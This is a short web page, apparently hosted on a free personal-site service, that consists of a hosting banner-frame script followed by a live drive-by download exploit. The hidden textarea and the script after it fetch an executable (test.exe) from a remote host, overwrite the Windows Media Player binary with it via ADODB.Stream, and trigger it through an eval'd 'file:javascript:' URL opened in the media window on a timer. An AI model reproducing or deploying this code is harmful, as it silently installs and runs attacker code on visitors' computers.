<script language="JavaScript">
  window.persctl='3D588B7B';
  v=window.top.persctl;
  if((v!='3D588B7B')&&(v!='78F55A9B')) {
    window.top.location.href=window.location.href;
  }
  if(window==window.top) {
    document.write('<html>\n<head>\n<title>');
    document.write(window.document.title);
    document.writeln('</title>\n</head>');
    document.writeln('<frameset rows="*,77" frameborder=0 marginwidth=0 marginheight=0 border=0 framespacing=0>');
    document.write('<frame src="');
    document.write(window.location.href);
    document.writeln('?" noresize scrolling="YES" frameborder=0 marginwidth=0 marginheight=0 border=0 framespacing=0>');
    document.writeln('<frame name="PERSBANNER" src="http://cgi.svnt.com/persbanner?c=31&p=espana/cadiz/varios" noresize scrolling="NO" frameborder=0 marginwidth=0 marginheight=0 border=0 framespacing=0>');
    document.writeln('</frameset>');
    document.writeln('</html>');
  } else {
    window.top.frames['PERSBANNER'].location.href='http://cgi.svnt.com/persbanner?c=31&p=espana/cadiz/varios';
  }
</script>
<textarea id="code" style="display:none;">

var x = new ActiveXObject("Microsoft.XMLHTTP");
x.Open("GET", "http://www.personales.com/espana/cadiz/varios/test.exe",0);
x.Send();

var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);

s.SaveToFile("C:\\Archivos de programa\\Windows Media Player\\wmplayer.exe",2);
location.href = "mms://";

</textarea>

<script language="javascript">

function preparecode(code) {
result = '';
lines = code.split(/\r\n/);
for (i=0;i<lines.length;i++) {

line = lines[i];
line = line.replace(/^\s+/,"");
line = line.replace(/\s+$/,"");
line = line.replace(/'/g,"\\'");
line = line.replace(/[\\]/g,"\\\\");
line = line.replace(/[/]/g,"%2f");

if (line != '') {
result += line +'\\r\\n';
}
}
return result;
}

function doit() {
mycode = preparecode(document.all.code.value);
myURL = "file:javascript:eval('" + mycode + "')";
window.open(myURL,"_media")
}


window.open("error.jsp","_media");

setTimeout("doit()", 5000);
</script>
